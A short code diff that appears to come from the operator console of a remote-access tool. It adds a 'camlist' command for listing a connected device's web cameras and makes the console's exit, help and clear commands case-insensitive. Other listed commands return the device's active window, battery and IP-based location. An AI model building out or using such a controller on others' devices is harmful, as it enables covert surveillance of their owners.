@@ -105,6 +105,7 @@ def help():
     activeWindow               --> returns active window
     battery                    --> returns battery info
     whois                      --> returns the ip, city, country etc of the device
+    camlist                    --> returns list of available web cameras
     clear                      --> clears the screen
     exit                       --> exit the interpreter
     """
@@ -144,11 +145,11 @@ def get_shell(ip, port):
                     "\033[1m" + msg) if "Hello there" in msg else print(msg)
                 message_to_send = input("\033[1m\033[36mConsole:/> \033[0m") + "\n"
                 conn.send(message_to_send.encode("UTF-8"))
-                if message_to_send.strip() == "exit":
+                if message_to_send.strip().lower() == "exit":
                     sys.exit()
-                if message_to_send.strip() == "help":
+                if message_to_send.strip().lower() == "help":
                     help()
-                if (message_to_send.strip() == "clear"): clear()
+                if (message_to_send.strip().lower() == "clear"): clear()
         except KeyboardInterrupt:
             print("Exiting...")
             sys.exit()
